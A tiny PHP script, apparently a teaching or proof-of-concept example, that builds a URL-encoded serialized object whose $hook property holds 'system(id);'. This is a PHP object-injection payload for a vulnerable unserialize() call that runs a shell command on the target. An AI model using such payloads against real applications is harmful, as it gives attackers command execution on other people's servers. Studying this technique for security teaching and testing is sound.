<?php
  class Example2 {
    //private $hook = "phpinfo();";
    private $hook = "system(id);";
  }

  print urlencode(serialize(new Example2));
?>
